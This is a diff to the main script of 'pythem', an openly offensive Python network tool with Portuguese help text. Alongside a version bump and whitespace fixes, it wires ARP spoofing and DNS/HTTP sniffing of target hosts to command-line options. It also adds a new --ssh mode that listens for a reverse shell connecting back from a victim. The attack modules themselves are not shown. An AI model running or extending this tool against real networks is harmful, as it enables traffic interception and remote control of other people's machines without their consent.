@@ -29,13 +29,13 @@ import argparse
 
 print get_banner()
 
-pythem_version = '0.1.2'
-pythem_codename = 'Naja'
+pythem_version = '0.1.3'
+pythem_codename = 'Taipan'
 
 if os.geteuid() !=0:
 	sys.exit("[-] Apenas para roots kido!")
 
-	
+
 
 if __name__ == '__main__':
 
@@ -48,17 +48,19 @@ if __name__ == '__main__':
 	parser.add_argument("-t","--targets",dest='targets', help="Endereço/Range IP do alvo. ex: './pythem.py -i wlan0 --spoof -g 10.0.0.1 -t 10.0.0.2'.")
 	parser.add_argument("--scan", type=str, help="Faz scan em uma Range IP para descobrir hosts. ex: './pythem.py -i wlan0 --scan 192.168.0.0/24'.")
 	parser.add_argument("--spoof", action='store_true', help="Redireciona tráfego usando ARPspoofing. ex: './pythem.py -i wlan0 --spoof -g gateway -t alvos'")
-	parser.add_argument("--arpmode",type=str, dest='arpmode', default='rep', choices=["rep", "req"], help=' modo de ARPspoof: respostas(rep) ou requisições (req) [default: rep]')
-	parser.add_argument("--filter",type=str, dest='filter', default='dns', choices=['dns','http'], help=" modo de sniffing: dns ou http [padrao=dns]. ex: './pythem.py -i wlan0 --spoof -g 192.168.1.1 --filter http'")
+	parser.add_argument("--arpmode",type=str, dest='arpmode', default='rep', choices=["rep", "req"], help=' modo de ARPspoof: respostas(rep) ou requisições (req) [padrão: rep]')
+	parser.add_argument("--filter",type=str, dest='filter', default='dns', choices=['dns','http'], help=" modo de sniffing: dns ou http [padrão=dns]. ex: './pythem.py -i wlan0 --spoof -g 192.168.1.1 --filter http'")
+	parser.add_argument("--ssh", action='store_true', help="Espera por uma conexão tcp reversa em SSH do alvo. ex: ./pythem.py --ssh -s 0.0.0.0 -p 7001")
+	parser.add_argument("-s","--server", dest='server')
+	parser.add_argument("-p","--port", dest='port')
 
 	if len(sys.argv) < 2:
     		parser.print_help()
     		sys.exit(1)
 
-	
 	args = parser.parse_args()
 
-	
+
 	interface = args.interface
 	range = args.scan
 	gateway = args.gateway
@@ -67,7 +69,8 @@ if __name__ == '__main__':
 	mymac = get_mymac(interface)
 	arpmode = args.arpmode
 	filter = args.filter
-	
+	server = args.server
+	port = args.port
 
 
 
@@ -85,14 +88,23 @@ if __name__ == '__main__':
 	elif args.spoof:
 		try:
 			from modules.arpoisoner import ARPspoof
-			spoof = ARPspoof(gateway,targets, interface, arpmode, myip, mymac)	
+			spoof = ARPspoof(gateway,targets, interface, arpmode, myip, mymac)
 			spoof.start()
-			from modules.sniffer import Sniffer			
+			from modules.sniffer import Sniffer
 			sniff = Sniffer(interface, filter)
-			sniff.start()			
+			sniff.start()
 
 		except KeyboardInterrupt:
 			spoof.stop()
 			print "[*] Finalizado pelo usuário."
 			sys.exit(1)
 
+	elif args.ssh:
+		try:
+			from modules.reverse_shell import Server
+			server = Server(server,port)
+			server.start()
+		except KeyboardInterrupt:
+			server.stop()
+			print "[*] Finalizado pelo usuário."
+			sys.exit(1)
